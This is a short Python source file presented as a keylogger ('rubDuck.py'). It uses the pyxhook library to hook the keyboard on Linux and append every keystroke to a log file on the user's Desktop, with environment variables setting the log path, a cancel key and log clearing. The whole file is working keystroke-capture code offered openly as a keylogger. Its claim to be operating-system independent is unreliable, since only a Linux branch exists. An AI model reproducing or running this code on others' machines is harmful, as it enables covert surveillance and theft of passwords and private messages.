#rubDuck.py
#
#Keylogger that is os independant
#

import os
import sys
import pyxhook

#Read Operating Systems

#Linux
if sys.platform.startswith('linux'):
    #Directory for log file
    log_file = os.environ.get(
        'pylogger_file',
        os.path.expanduser('~/Desktop/keyLog.log')
    )
    #Setting the cancel key
    cancel_key = ord(
        os.environ.get(
            'pylogger_cancel',
            '`'
        )[0]
    )
    #Clearing log file if clean is defined
    if os.environ.get('pylogger_clean', None) is not None:
        try:
            os.remove(log_file)
        except EnvironmentError:
            pass #File does not exist or no permissions
    #key press event and parses to log file
    def OnKeyPress(event):
        with open(log_file, 'a') as f:
            f.write('{}\n'.format(event.Key))
    #hook manager object
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress
    #setting hook
    new_hook.HookKeyboard()
    try:
        new_hook.start() #hook start
    except KeyboardInterrupt:
        pass
    except Exception as ex:
        #write exceptions to the log file
        msg = 'Error while catching events:\n   {}'.format(ex)
        pyxhook.print_err(msg)
        with open(log_file, 'a') as f:
            f.write('\n{}'.format(msg))